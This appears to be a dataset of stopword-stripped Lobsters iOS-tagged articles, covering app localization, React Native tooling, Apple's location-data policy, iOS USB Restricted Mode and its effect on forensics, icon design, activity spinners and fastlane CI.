automatically localizable file step writing code application manually add string designated file localization bottomline step internationalization end io developer need take following step order internationalize app settingup project make new project existing application want internationalize make sure property named use base internationalization checked project info setting shown xcode see picture three box red black blue navigator panel first select root file xcodeproj project red box shown select type project see two option available target default option need change project black box shown make sure check option use base internationalization option blue box shown use base internationalization xcode upon creation new project xcode automatically generates file related localization check use base internationalization option xcode transfer mainstoryboard launchscreenstoryboard baselproj folder default language base language tutorial english mentioned decision section done basic step need add different language want application support tutorial going use three chinese traditional localization representing different locale discussed decision section let u add support three language adding language localization order add language application localization need go project info setting click button shown xcode present list language want localize let u choose french first upon selecting language case french xcode ask choose file reference language create desired language localization french case shown picture two thing require attention reference base language designed application bydefault english leave file sure file set localizable string furthermore see two going make localizable since selected click finish guide continuous localization find continuous localization save agile development grow business global scale check guide change project language support upon adding support french language localization see following three change project file xcode create folder named frlproj project since added support french language folder xcode create two string file associated storyboards selected previous step third change however depends upon add localization support application followed recommendation mentioned top regarding internationalize localize application would see label presented mainstoryboard launchscreenstoryboard given objectids added mainstrings launchscreenstrings file one label hello mainstoryboard launchscreenstoryboard empty mean must one hello object mainstrings french file well objectid shown left half image show user interface mainstoryboard contains one label whereas right half show string file associated add chinese traditional german language well following aforementioned step going look localization part application localization io localization io basically translating process two method use translate application directly xcode developer exporting localizable file xliff format translator let discus method one one within xcode internationalization part generated mainstrings localizable file different language shown contain one label text hello go localizable string file change text hello respective file language case launchscreenstoryboard contain element hence would empty translated file would look like preview application setting iosdevice locale either one language would get translated userinterface shown exporting localizable file translator method shall see export localizable file localizers translator first create separate folder shown see two folder within folder localizers folder developer export localizable file translator localizers folder would import localized file translator project creating folder go back xcode project open project info setting make sure info setting page order get export localization option editor menu editor menu click export localization shown clicked export localization option xcode ask save localizable file specified folder shown see picture three language selected exported localizers folder xliff localization interchange file format developer job done wait translator translate string present xliff file send back format receive translated xliff file import project using editor menu shown time select import localization option recommended method internationalization first localization section apparently seems nice dandy let u ask three basic question io developer really command language locale support apple service depend google translator service precise translation le timeconsuming efficient solution answer first question definitely speak four language many language speak comment giving perspective google translator service let share translation using google translator german speaker therefore take testcase wanted translate ready set go german got result google translator yay sudden thought reverse translate lo behold get following translation german english adjust really confused hence professional application dependent upon service efficient solution must wondering google service come answer third final question better would access native translator different locale one place precise translation awesome need export xliff file without worrying translation process well phrase make life easier support xliff file provides comprehensive developer friendly translation management solution learn phrase guide jump right phrase getting started guide io hope article help get ball rolling make confident adding io internationalization localization application much cover saying meet
205,Lobsters,ios,Apple iOS,My Steve Jobs stories,https://www.facebook.com/permalink.php?story_fbid=2146412825593223&id=100006735798590,steve job story,,‡§Ø‡§π alt
206,Lobsters,ios,Apple iOS,Apple cracking down on applications that send location data to third-parties,https://9to5mac.com/2018/05/08/apple-location-apps-third-parties/,apple cracking application send location data thirdparties,legal legal due general data protection regulation gdpr european union one public tweet mentioning subscribe youtube apple news check youtube apple news,last day apple seemingly started cracking application share location data thirdparties case apple removing application question informing developer app violates two part app store review thus far seen several case apple cracking type application company informs developer via email upon reevaluation application violation section app store review guideline pertain transmitting user location data user awareness data collection legal legal app transmits user location data third party without explicit consent user unapproved purpose apple explains developer must remove code framework sdks relate violation app resubmitted app store apple crackdown application come amid growing industry shift due general data protection regulation gdpr european union apple always privacyfocused company seemingly looking ensure developer take care user data instance seen apps question enough inform user happens data addition simply asking permission apple appears want developer explain data used shared furthermore company cracking instance data used purpose unrelated improving user experience may use transmit someone personal data without first obtaining permission providing access information data used data collected apps may used shared third party purpose unrelated improving user experience softwarehardware performance connected app functionality point unclear broad cleansing effort app store seen least one public tweet mentioning program several developer mentioned privately subscribe youtube apple news video ftc use income earning auto affiliate link check youtube apple news video
207,Lobsters,ios,Apple iOS,"The ecosystem of React Native can be improved, beyond technically",http://cs.mcgill.ca/~mxia3/2018/05/09/the-ecosystem-of-react-native-can-be-improved-beyond-technically/,ecosystem react native improved beyond technically,others calvin payment hit miss native abstraction community fragmentation release management benefit improvement separate repo towards better react native ecosystem,react native fantastic tool brings wellreceived react onto mobile platform enables developer program platform agnostic mobile apps using modern tool technique today many apps large user base written react native airbnb discord instagram others given wide adoption well amazing ease target io android single code base ideal choice calvin payment solution cofounder created help people pay restaurant bill faster easily practice developing react native bittersweet experience hit miss native abstractionsreactnative promise unified abstraction io android ie write run platform practice complicated nontrivial app typical content driven apps fetch data remote apis display screen might problem interacting camera processing payment apple pay accessing location service background task possible without interacting native code unfortunately writing react native library native code targeting io android simple task take look popular library issue platform specific isolated case common pattern community community fragmented adoption newer version user slow upgrading nontrivial reward effort people till best way upgrade react native use reactnativegitupgrader although tool us git automatically resolve lot merging decision user still need perform threewaymerging multiple conflict process time consuming prone mistake newer version react native may provide additional feature bug fix also come cost regression bug result unless new feature bug fix fundamental developer take broken fix position keeping date react native increase effort library author often working time make sure library work multiple version react native release management benefit improvementsrn developed fast pace average commits get pushed repo every week managing release across multiple minor version hard task many user complained patch blocking regression cherrypicked patch version release least timely manner consequently many user forced apply patch fork compiling react native source adding significant time build past attempt crowdsource commits cherrypicked stable release issue got lost quickly pile newly created issue barely attracting enough attention newer release tracking issue minor release separate repo hopefully remedy issue facing stable release towards better react native ecosystemwith popular react native became shortage contribution experience developer newcomer trying build brand issue mentioned often entirely technical library maintainer course write integration endtoend test cover multiple platform across multiple react native release balance need carefully maintained keeping quality project high versus encouraging open source contribution ecosystem react native pleasing contributor way much merging patch given enough thought result lot platform specific bug contributor code one io android majority library consumer reluctant keep date wanting spend week discovering hidden regression bug finally like jeff geerling spoke default response pull request
208,Lobsters,ios,Apple iOS,iOS 11.4 to Disable USB Port After 7 Days: What It Means for Mobile Forensics,https://blog.elcomsoft.com/2018/05/ios-11-4-to-disable-usb-port-after-7-days-what-it-means-for-mobile-forensics/,io disable usb port day mean mobile forensics,update io beta usb restricted mode arrived usb restricted mode io forensic consequence usb restricted mode usb restricted mode lockdown record logical acquisition locked unknown passcode without passcode could used powercycle reboot iphone expire day happens day mitigation apple needed usb restricted mode greyshift conclusion,update june usb restricted mode make io however io beta usb restricted mode arrived new io update roll next week even day reading apple documentation researching developer beta discovered major new security feature released io update disable lightning port day since device last unlocked meaning security measure reason behind done let closer look usb restricted mode io io beta apple introduced new called usb restricted mode fact feature made first appearance io beta later removed final release work improve security locked io device communicate usb accessory must connect accessory via lightning connector device unlocked enter device passcode connected least week functionality usb restricted mode actually simple iphone ipad updated latest version io supporting feature device disable usb data connection lightning port one week device last unlocked point still unclear whether usb port blocked device unlocked passcode consecutive day device unlocked password biometrics device unlocked connected trusted usb device computer test able confirm usb lock device left idle day period tried unlock device touch id connect paired usb device know however day lightning port good charging forensic consequence usb restricted mode restricted usb mode requires iphone running unlocked least every day otherwise lightning port lock charge mode iphone ipad still charge longer attempt establish data connection even trust computer prompt displayed device connected computer existing lockdown record itunes pairing record honoured user unlocks device passcode word law enforcement day time device last unlocked perform extraction using known forensic technique logical acquisition passcode recovery via greykey service even day given since exact date time device last unlocked may known usb restricted mode lockdown record io one could use existing lockdown record access iphone ipad device purpose creating new local backup logical acquisition essentially exactly expert perform logical acquisition vast majority case iphone ipad device locked unknown passcode lockdown record small file extracted suspect computer allows accessing essential information device initiating backup sequence without passcode addition itunesstyle backup lockdown record could used pulling medium file picture video list installed apps access general information device created lockdown record would expire however powercycle reboot iphone even valid lockdown record little use unlock device passcode fulldisk encryption io brought limitation use lockdown record io lockdown record would expire certain unspecified time lockdown record expired could longer used establish communication io device user would need enter passcode device establish new pairing relationship io limited lifespan itunes pairing record making record expire day happens day apparently io store information date time device last unlocked data connection usb port seven day elapse lightning port disabled happens longer able pair device computer usb accessory use existing lockdown record without unlocking device passcode thing able charging whether iphone unlocking solution developed greyshift cellerbrite work still open question mitigation usb restricted mode aimed squarely law enforcement preventing device acquisition device stored consecutive day without unlocked connected paired computer usb accessory time suggest two possible mitigation extract device first day using lockdown record available attempt unlock device first day unlocking solution eg greyshift disable usb restricted mode initial connection made lightning port still active lockdown record available connecting device paired accessory computer may extend time usb port remains active however bear mind lockdown record carry expiry date addition managed device may disable usb restricted mode good success rate receive condition phone delivered lab phone seized still powered kept powered meanwhile chance successfully connecting phone computer purpose making local backup depend whether expert access nonexpired lockdown file pairing record however phone delivered poweredoff state passcode known chance successful extraction slim best apple needed usb restricted mode actually matter time company cellerbrite recent newcomer greyshift make business unlocking protected iphones cellerbrite offer exclusively inhouse service service available select law enforcement agency proper court order greykey supply actual unlocking hardware north american law enforcement company keep lip shut detail technique exact method use gain access device known apple however ability unlock even latest hardware running latest version io worrisome apple taking action usb restricted mode conclusion responce latest development apple made attempt prevent device exploitation usb restricted mode effectively disables iphone ipad lightning port day without unlock undoubtedly strengthens overall security io device effectively disabling logical acquisition lockdown record day device storage effect passcode unlocking technique developed cellerbrite greyshift yet seen else apple baking io without going lengthy list bug fix improvement possibility imessage sync icloud finally released io imessage sync showed early beta io make final release feature appeared io beta stripped final release last minute sign feature might ready prime time io imessage sync work different continuity challenge benefit present mobile forensic crowd stay tuned find
209,Lobsters,ios,Apple iOS,iOS Design Inconsistencies Across Apple's Apps,http://benjaminmayo.co.uk/ios-11-design-inconsistencies,io design inconsistency across apple apps,upgraded toolbar icon,may bugging definitely since io unveiled last june probably clue apple strategy io app icon set resign truth one simplicity focusing share icon post apple formally call action button criticism apply much widely io infamously introduced line icon toolbars geometric boxy shape like io controversial shift came apple apply consistently every bar icon every app transmogrified house style share button simplified square arrow pointing remains system default today regardless thought sterilisation pixel stroke complemented restrained shadow superthin font choice original io design community response radical redesign split recall hating seem like apple dead set either time apple retracted thing font became le whisperthin popover logical layer incorporated real drop shadow synergy icon set began disappear divergence beginning note reminder apps inexplicably retained paper background texture realism letterpress effect applied bar icon see normal share icon third left note version inner shadow endbutone position row io apple began reintroduce pill button io button background platter indicate press well bolder font new apps like map news also emboldened icon match see map share button glyph far right collage apple made whole new typeface san francisco became global system font weirdly icon glyph changed despite premise io icon supposedly symbiotically decided match typography io added home app adopted appeared modern app appearance bolder font aplenty bubbly accessory tile replete filled rounded icon toolbar add list symbol use thicker line weight still default suite apps change io pushed several apps getting new tabbar icon rounded style yet icon emboldened even app photo app bubbly tab bar glyph tap image action icon present io maybe pattern tab bar icon rounded toolbar icon stay geometric line representation dramatic overhaul podcasts app store io disagree modern tab bar icon modern glyph fact share icon curved shape also twotone arrow opaque blue whilst box lighter desaturated colour see position apps variation icon style currently incredibly end story ibooks io upgraded toolbar icon bolded rounded result first share icon row personal favourite bringing essence io sane balance simplicity elegance creates icon inviting friendlier visually pleasing may wondering whiteonblack icon share icon clip version released post io debut brings yet another genetic mutation mix bold round round round io icon might second favourite bunch also one reminds io era ignoring difference colour palette comparison course perfectly acceptable app tint theme influence icon appearance gripe consistency structure logic apps introduced later sometimes use rounded icon sometimes sometimes create allnew custom glyph incredulously could open flagship apps like message mail safari idea apple even playing bold icon conceptual change apps adopted io large bold navigation bar title format icon glyph stagnated four year point icon showed apple builtin default apps expect set standard io design language reality far perfect point scattershot mess competing vision say apple human interface team want share icon look like let alone structure experience io apps whole everything disarray
211,Lobsters,ios,Apple iOS,"Exploring React Native Ecosystem - backend, database and best libraries",https://www.simform.com/react-native-ecosystem-backend-database-best-libraries/,exploring react native ecosystem backend database best library,,state management react nativemobx provides functionality update manage app state used react make good candidate state management react simplicity testability also short learning curve thing like async function computed value already handled behind scenesreduxredux predictable state container javascript javascript framework managing maintaining application state usually used conjunction framework build applicationsrelaya powerful framework building data driven application relay powered touted rest successor graphql devs usually chose either two worth noting use complement wellaltunidirectional isomorphic boilerplate free way manage react native apps used use alt lot project redux came picturedebugging tool react nativechrome developer tool simplest way debugging react native code use chrome need install apps press io simulator android emulator shake real device see inapp developer menu tap debug j remotely reactotron reactotron desktop app allows debug react react native apps key feature include inspecting modifying subscribing app state tracking http request made app benchmarking app performance tracking error using redux even dispatch action track saga within reactotrontesting automation tool react nativedetoxdeveloped wix react native detox end end testing library help developer test simulate user behaviour basis user interaction app best part come multiple device configuration permission notification etc user expect appenzymedeveloped airbnb javascript testing utility react enzyme useful assert manipulate traverse output react component intuitive flexible api built mimicking jquery api dom manipulationit compatible almost test runner library theremochamocha javascript test framework run nodejs browser built make asynchronous testing easier fun mochareactnative help easily setup mocha test react nativelokiloki lightweight tool visual regression testing storybookbitbarbitbar cloud based mobile testing framework automating testing react native apps support many open source testing tool appium xcuitest xctest espresso calabash many bitbar also provides rest api support integration various cicd tool jenkins travis ci etcappiumappium open source test automation tool allows developer test native hybrid mobile web apps come react native allows run fully automated test emulator actual device simulatorrobotiumrobotium pretty decent test framework write robust automatic test ui case application developed android robotium developer feasibility write function different acceptance test scenario testing android applicationsjestjest standard automated javascript test runner maintained facebook using jest test react native application developer required write snapshot test save output rendered component file compare component output snapshot consecutive run method useful observing behavioral change component applicationjasminejasmine open source testing framework react native specifically javascript wholebridgebridge provides complete native api access react native app executing j code nodejs hasslefreely test mock free without dig native code go handy using testing tool detox mocha testing frameworktools performance monitoring crash reporting react nativenew relicnew relic mobile apps deeply integrated new relic web mobile browser application share onescreen view making new relic combined service capability solution monitor software matter running app server browser mobile device open source library called react native new relic wix developer worth checking outfabric answersfabric answer let keep eye realtime statistic app consumed user include number active user retention rate session length etc fabric also builtin crashlytics useful track report crashing appbugsnagbugsnag tool help react native developer quickly resolve native j error capturing realtime exception mobile application offer two realtime apis track bug notifier api notifier api bugsnag mainly used alert whenever error exception trackedthe deploy tracking api deploy tracking api bugsnag track multiple deploy version app keep developer informed deploy version error caughtsentrysentry provides open source error tracking show every crash stack happens detail needed prioritize identify reproduce fix issue link react native sdk feeling lazy todaypleakpleak upcoming performance monitoring tool react native apps beta release trial soon sign official website get notified releasetools continuous integration deploymenthere really cool cicd tool may consider using react native project apphubthe apphub service allows developer combine one microapps together global navigation common mechanism user authenticationmicrosoft codepushcodepush cloudbased service microsoft seamlessly provides react native developer deploy overtheair update directly user device act central repository developer publish deploy change html cs javascript imageswith codepush developer find great deal pushing bug fix app without need upload newest version directly appstore wait user update app versionbitrisebitrise great tool continuous integration react native allows run test build app anytime code merged automatically push app end user device deployment best feature bitrise ability integrate bunch service every step development portfoliobuddybuildbuddybuild continuous integration ci continuous deployment cd platform help developer seamlessly build integrate push live update app air without worry integration processfastlanethinking devops fastlane build continuous deployment pipeline mobile apps though solution work well react native often get bit difficult setupcirclecicircleci cloud based system continuous integration deployment native apps working circleci developer access project build artifact complete box solution continuous integration need minimal configuration adjustmentstraviscitravisci another sophisticated well built automation tool help developer help understanding whether application working fully tested reported according build sequence configured said travis ci continuous integration tool aid speed development react nativefabric beta deploymentfabric used catch crash beta build apps live production helpful tracking user metric device used retention daily user etcwatchmanwatchman wonderful tool detect code change thereby providing automatic build push update facility facilitates developer fastly deploy code without refresh code manually one helpful tool available react native open sourcewatchman also made work storyshots automatically generate ui snapshot test developer build view write test timenevercodenevercode api might crazy helpful implement continuous integration react native build best part require write code twice instead scan repository let configure build itpayment provider react native appsreactnativepaypalthough official commit made paypal reactnativepaypal matt foley go great length support react native paypal support io android platformstipsistripesimilar paypal stripe backing sdk react native either thankfully folk tipsi created wrapper tipsistripe help safely integrate stripe appsrazorpaythankfully razorpay created react native wrapper io android apps facilitates making payment app looking payment provider official support razorpay something definitely worth checking outi still know reason giant like paypal stripe committed towards building sdk react native hopefully situation change real soontools push notification react native sendbird sendbird provides chat api messaging sdk inapp messaging mobile apps websitesurban airship library github module react native seamlessly integrate push notification service apps io android developed react native module designed crossplatform therefore possible developer leverage using codebase platformsreact native push notification useful implement local well remote push notification react native android iosonesignal push notification module implementing push notification react nativepushwoosh integrating push notification react native using pushwoosh servicejpush jpush proven largescale app push platform delivers million message daily dedicated react native sdk use easily build push notification servicespushbots pushbots allow react native app send push notification mobile platform accessing dashboardlocalytics provides inapp email remarketing campaign allows trigger instant notification localytics push api joint session event profile data easily create define target segmentsui framework library boilerplatesreact native pop menubuilt developer instea react native popup menu easytouse customizable popup menu react native io android library recently crossed star github actively contributed react native community member timetotime aside react native mobile also work reactnativeweb universal window platform appreact native paperreact native paper developed developer callstackio aim provide material design component react native apps android io paper boast well crafted beautifully designed material design component give exactly yes exactly feel android io platform team callstack announced adding exciting component button toolbars paper etc upcoming version allinall great fan material design like give react native paper trycarbonuicarbonui material design library react native apps work well platform io android extremely customizable come theming animation grid systemsignite clihere thing react native many part many update myriad thing take care devs thankfully ignite cli react native toolchain highly adaptive project starting new react native project checklistnextframedeveloped kyle corbitt next frame library help app break background task chunk block ui operation next frame help build really high performance user interface would note codebase updated since derive great performance minor modificationsreactvirginreactvirgin beautiful ui kit react native brings following ui element table reactnavigation boilerplatehorizontal vertical listbuttons headersgridview chat bubble loaderssnowflakesnowflake originally built boilerplate could help built react native app io android seamless connectivity parse dead hapinativebaseone appreciated ui kit time nativebase cross platform ui kit solution specifically designed provide app truly native look feel offer many option choose form custom component spinner form component floating action button best part implementation module somewhat similar io android platformbuilderxbuilderx great tool react native designer developer design app inside builderx design would automatically produce source code amazing shoutemshoutem ui highly customizable ui kit react native component seamlessly integrate ui make extremely easy develop complex user interfacespepperoni react native starter kitinstead build react native app ground pepperoni react native starter kit help remain focused product development utilising prebuilt react native componentsnachosdeveloped devs avocode nacho ui open source react native based ui kit made aim provide readytouse component react native appteasetthis ui library react native strongly focused feature content display action controlpanzadiligently inspired popular rebass library panza provides set commonly used functional ui component react native component higher degree customization work well platform android iosreact native ui kittenreact native ui kitten framework contains set commonly used ui component styled similar way using library focus business logic take care visual appearanceant design mobileant design ui much react native ui kit many usable ui component modal navigation menu etc name however suggest go minimalistic usage ecosystem since could also cause deal breaker longer run reason go minimalist repository filled issue chinese languagereact native material designif planning use physic animation material design react native app definitely go facebook official material design port react native looking something specific android found something missing react native material kit material react native wellreact native elementsreact native element set element follow platform specific design language great component library building consistent interface across io android device using react nativereact native style tachyonsbuilt upon philosophy functional styling react native style tachyon brings user testing developing ui scale library something definitely check people varying level dev skill going work react native app seen devs use library design system work everyone matter dev skillslists react nativecreating list often onehellofaride react native developer spoke issue react native performance blog post open source library use within react native app avoid issuesreactnativelargelistif used sectionlist would faced issue common really large list view react native reactnativelargelist solves issue exists large list view using sectionlist significantly low cpu usageatozlista fork brett vante listview atozlist brings enhanced performance large list view define configure list height cell structure etc using atozlist wellreactnativescrollablelista scrollable listview component react native ever found situation list item stretch horizontally reactnativescrollablelist youreact native sortable listif ever found situation list item stretch horizontally reactnativesortablelist really amazing work tim gibadullinreactnativesynchronouslistlast september tal kol spoke synchronous rendering react native checked yet check reactnativesynchronouslist make extremely easy implement infinite scroll synchronous rendering otherwise could really huge challengereactnativeimmutablelistviewif immutable data nested object need better performance animated screen transition reactnativeimmutablelistview built keeping three mind seen many replace listview flatlist virtualizedlist library fluidity higher performanceanimations react nativereact native reanimateddeveloped krzysztof magiera react native reanimated library lowlevel abstraction built top official animated api provides much greater flexibility especially come handling gesturebased animation first revealed react europe conferencekrzysztof started working reanimated found official animated library limitation come gesturebased animationsin word krzystof started working reanimated fix matter pan interaction object dragged along screen released snap someplace screen situation despite fact using animatedevent could map gesture state position box make whole interaction run ui thread usenativedriver flag still call back j end gesture u start snap animation animatedspring start used declarative manner get executed side effect starting process animation update value timehere video kryzstof gesture handler reanimated talk react europe conferencereact native interactablereactnativeinteractable animation library specifically focus animation highly interactive nature even interactive demo available app store download mobile see animation build using libraryreact native animatableplanning use animated visual feedback animation system status connected transition state even grab user attention using animation reactnativeanimatable everything needideally suited development general application game react native animated sprite feature rich declarative component particularly used animation tweening dragging us react native animated class tweening react native pan responder dragging actionslottielottie io android react native library render effect animation real time allowing react native apps use animation easily use static image without bringing performance overhead lottie written developer airbnb one hell gem beauty render animation natively misc toolsyarn dependency manager tool react nativeflow flow static type checker help prevent javascript natural ambiguity causing bug applicationstorybook storybook react native design develop individual react native component without running appreact native cli small node application offer simple init command used create new react native application using react native cli create standard react native app necessary file dependency needed build app io android open native project xcode android studioconclusionwhile tried covering much could blog post end somewhere feel something react native ecosystem missed feel free reach rakshit simformcom drop comment
212,Lobsters,ios,Apple iOS,The thinking face of software,https://medium.com/compoucher/the-thinking-face-of-software-b32869caae9,thinking face software,thinking face software http githubcomzmcartorthinkingfaces http codepenioionicpenggwvon http wwwclaireundycom http think appropriate call activity spinner application thinkingface rotating circle google sticky circle physic personality beyond clockwise like talk apps animation let get touch,thinking face softwareall custom spinner http githubcomzmcartorthinkingfaces give second thinking first advice dad gave demonstrating insert gigantic threeinch floppy disk new computer little light blinking mean something watching disk light hypnotized chaotic flickering young mind rapid sequence light dark foreign language describing going inside mysterious contraption long period light seemed say conjuring data soon nowadays blinking light evolved everpresent activity spinnersource http codepenioionicpenggwvonthere sublime comfort watching animated form repeat zen feeling last second turn whitehot rage wonder name fuck taking long academic practical reason spinner provide user continual feedback human require constant reassurance request lost machine dutifully handling basic progress indicator human facesource http wwwclaireundycoma verbal request another human elicits response proportion gravity subject matter person expression change know two important thing speak language understand requestpreparing response give seconda furrowed brow pouted mouth body language act waypoints internal thought process call thinkingface unsettling experience speak someone without facial expression aside psychopath supposedly emotion mimic facial pattern normal people said software offer user feedback psychopathic well conditioned cultural norm facial expression associated thinkingface unique every personsource http think appropriate call activity spinner application thinkingface human give feedback another preparing response application use thinkingface craft consistent personality form relationship usersorry stop handwavy design wankery dig exactly consistent personality mean regard softwarein modern design widespread thinkingface come apple io uiactivity spinnergeneric flowerspinnerthere many riff design basically idea steady motion gently fading hand evoke feeling control high quality craftsmanship form rotating circle evoke clock hand winding around passing time adding subtracting petal creates variety interesting petal different effecta long time ago apple microsoft used pixely timepiece thinkingfaces apple system microsoft window xp visual cue give second easy imply timepiece showing long visceral reminder wasted timemicrosoft hourglass many wasted hoursmore rotating circleswindows introduced abstract blue circle rotating highlight much like io spinner give feeling designed control opaque circular track artistic uiactivityindicator io convey predictability moving clockwise could also imply frontload washing machine twitter youtube gmail many website use derivation design communicate control predictability site also add affordances dynamically communicate personal touch depending contextgoogle sticky circle one google many thinking facesmore dynamic controlled rotation thinkingface feel intelligent organic use complementary rotation expansion speed added motion differentiates robotic rotatingsolidcircle give followon feeling ai fairy dust whatever data shown afteri made slightly modified version spinner thins wrap around circle like inchworm color parameter tunedgoogle inspired stickyspinnerrotating circle offer fun constraint thinkingface go even color opacity rotational rate thickness attribute changed course animation finetune personalitythe physic personalitygoing modeling physical force smooth rotation offer richer set constraint interesting facesplinky solar systemstill circle playful stopandgo rotation planet funny change smooth motion reminiscent mechanical gumball machine authentic precise would appropriate game lighthearted social medium appeven interesting combining simple shape along path give impression selfpropelled sphere rotating square knob abstract machine thinkingface think would appropriate app converted video compressed data motion feel industrial like junkyard compacter smashing large hunk steelkinetic motion driving rotationbeyond clockwisethe next animation disregard circular motion entirely instead keep temporal rhythm abstract meansanimating vertically invokes motion sun rising setting feeling time passing single axis fun design constraint motion form follows custom timing curve tuned fit app personalitythe primordial rhythm time heartbeat consistent pulse energy another interesting constraint whole class thinkingfaces could created concept heartrhythm design would fit think medical professional service oriented app like bank insurance design abstract accomplished single colorbe still beating heartthanks much reading researching programming various spinner made notice little trick digital analog device use keep u engaged offer feedback hopefully make next time wait software slightly interesting like talk apps animation let get touch
213,Lobsters,ios,Apple iOS,Easy CI with fastlane: How we automated everything iOS from running tests to distributing a build,https://medium.com/aaptiv-engineering/easy-ci-with-fastlane-how-we-automated-everything-ios-from-running-tests-to-distributing-a-build-5ecbb817fba0,easy ci fastlane automated everything io running test distributing build,easy ci fastlane automated everything io running test distributing build apple watch app ivan lee fastlane fastlane rescue get started iosci yourcompanycom lastpass enterprise free alternative secure messaging platform saas versus device lab ci tool setupcircleci swiftlint slack learned xcode scheme develop beta production one xcode project config match setting fastlane match watchkit extension multiple xcode target tip incrementbuildnumber unit test code coverage notification strategy fastlane scan slack webhook url slack isci scan tip best practice fastlane documentation go,easy ci fastlane automated everything io running test distributing buildhello andrew lection io engineer aaptiv recently launched awesome new feature like apple watch app training program user also taken long hard look used thing make sure building effective sustainable process addition cool new featuresin article teaming ivan lee lead test engineer show solved ci woe fastlane share lesson learned best practice troubleshooting tip exciting new chapter team development process beginning weredevelopers ran unit test locallyreviewers pr see result unit test code quality informationengineers adding new testing device needed click around apple developer portal lottesters know new build ready sometimes needed use external tool like diawi install buildinternal user use dogfooding build issue manually updating provisioning profilesactual picture developer learning volunteered send dogfooding buildwe decided first priority focus implementing continuous integration io apple watch apps well lay groundwork eventually implementing ci android apps fastlane rescue chose fastlane ci tool choice following reason opensource toolset tremendous outstanding supportit incredibly flexible let u automate io specific task like certificate management automatically incrementing build number device provisioningit portable get vendorlocked fastlane coupled particular ci platform easily migrate fastlane implementation different saas provider selfhosted cibefore get startedyou want sort small important list thing need make fastlane implementation frictionless possible also ensures ci process maintainable long time comeyou need email account creating bunch account even tackling android ci good email like iosci yourcompanycom help keep thing organizeda github insert scm account ssh key pair need ci system want automatically increment build number ssh key pair also automatically commit changesan apple developer admin account fastlane match handle messy provisioning business need give account password management done something like three account ssh key pair match repository password set fastlane local development need access apple developer account match repository password use lastpass enterprise securely share password team though also use free alternative even secure messaging platformssaas versus device labfastlane working mobilefocused open source ci tool exciting news excited take fastlaneci spin late meantime need choose running mobile ci inhouse using jenkins atlassian bamboo cloudbased saas provider like circleci travisci gitlab selfhostedprossuper flexible control mobile ci lab plug rest company infrastructure particularly important work highlyregulated industryyou centralize build single location mobile special snowflake consnumber parallel build limited number physical devicessome solution ie jenkins dependent infrequently maintained pluginshigh initial cost ongoing opportunity cost ongoing maintenancesaasprosthere smaller infrastructure lift start running mobile ci making adoption easier frictionlessbuild environment stable term infrastructure update constroubleshooting xcodecode signing issue difficultdepending platform team practice monthly fee become expensive timewhat doingwhen developer open pr circleci automatically build io projectcircleci automatically install code signing certificate provisioning profile local keychain configured using setupcircleci action fastlane run swiftlint run unit test generates code coverage fastlane build ipa dsym fileswe choose distribute build via aws using addon qa crashlytics internal user using fastlane slack support notify team thing go rail eg build fails succeed beyond wildest dream ie build ready qa test definitely risk alarm fatigue work team find many notification right learnedxcode scheme develop beta production one xcode project config allto facilitate daytoday development activity well nightly beta build needed modify xcode project scheme structure play nice fastlane matchwe organized xcode project three separate build configuration debug local development point staging environment provisioned development profile development cert order engineer build development devicesbeta internal distribution also point staging environment provisioned ad hoc profile distribution cert order build deploy internal dogfoodingrelease archiving production build submit app storefirst deactivated automatically manage signing xcode set provisioning profile xcode signing located general tab respective match provisioning profile development ad hoc using match along shared xcode provisioning setup ensure io provisioning code signing handled consistently reproducibly created three separate xcode scheme one build configuration ensure scheme checked version control checking shared box scheme edit window creating new scheme xcode scheme run configuration set respective build configuration ie debug beta release shared xcode scheme structure engineer run fastlane match ensure local provisioning profile date fastlane match development readonlyand mobile ci easily specify fastlane deploy ad hoc build beta scheme without ever specify additional xcode configurationboomsetting fastlane match watchkit extensionin addition main io application target project contains watch watchextension target apple watch app use fastlane match generate development ad hoc provisioning profile watch target fastlane match effortlessly able handle provisioning profile generation multiple xcode targetsin way set xcode signing main application target deactivate automatically manage signing watch watchextension target set provisioning profile respective match profile debug beta releaseand voila build deploy io apple watch apps using fastlane gym want deploy ad hoc build beta run configuration simply configure beta lane run gym command lane beta gym scheme beta configuration beta exportmethod adhoc endtip using useful recommended incrementbuildnumber action ensure xcode project plist path watch watch extension target relative path order facilitate plist editing making sure srcroot removed plist path specified build setting watch targetsunit test code coverage notification strategytesting important valuable step development cycle across product process aaptiv including io android codebases specifically io unit test suite add logic test defend introducing regression new branch well providing additional validation refactor component within codebasewe use fastlane scan run xctest suite open pr report result unit test code coverage order run unit test generate report simply wrap call scan command test lane fastfile actual scan command parameter minimal since set parameter default scanfile including xcode scheme array device type string output type generated reportswith feedback loop place exactly surface unit test result avoiding alarm fatigue also sometimes io notification channelfor starter created slack channel specifically iosrelated test build notification corresponding slack webhook url plug fastlane builtin slack action using fastlane slackurl environment variable next team decided upon notification strategy result notification sent io notification channel unit test failurenightly build failuresuccessan error occurred lanethis notification strategy worked well team propagating alert scenario interested surfacing notification centralized channel course notification strategy vary team team depending upon team workflowadditionally ensure notification broadcasted fastlane run within mobile ci using fastlane isci action want send notification time run unit test locally order limit notification posted unit test result scan tool two convenient parameter skipslack use prevent posting notification unit test run locallyslackonlyonfailure use post notification unit test fail run mobile ciwith thought notification strategy place funnel success failure result slack well surfacing unit test status within opened pr awesome tip swiftlint erroring fastlaneswift file exclude bundle path ie vendorbundle swiftlintyml config file adding excluded vendorbundleyou also want add cocoapods path well exclude swiftlint erroring dependency built project excluded podsbest practicesthere wealth resource outstanding official fastlane documentation well various point knowledge web development aaptiv following best practice helped u developing fastlane ci solution single responsibility lane ensure fastfile lane single responsibility additional requirement added want add step pipeline treat lane individual unit linked together ci workflow configuration provide flexibility future without bloating individual lane spending le time refactoring reworking lane future specify default outside fastfile reduce clutter fastfile specifying param default deliver gym match scan respective deliverfile gymfile matchfile scanfilegemfile repo recommend adding gemfile root io project ensure local development environment specify use fastlane gem versionfastfile discoverability add description lane extra discoverability succinct single responsibility one lane ie build adhoc ipa file increment io build number desc increment io build number lane buildbump endwhere go hereover last major project running two half month fastlane helped u code test release confidence total used ci process build ten adhoc release twentytwo nightly release four beta releaseswhile happy ci process always room improve enhancement like tackle next month automating app submission apple app storeallowing developer add release note internal build beta tester always know going speeding project build time caching cocoapods investigating new xcode build system caching project file building changed file interested set ci android using jenkins fastlane docker stay
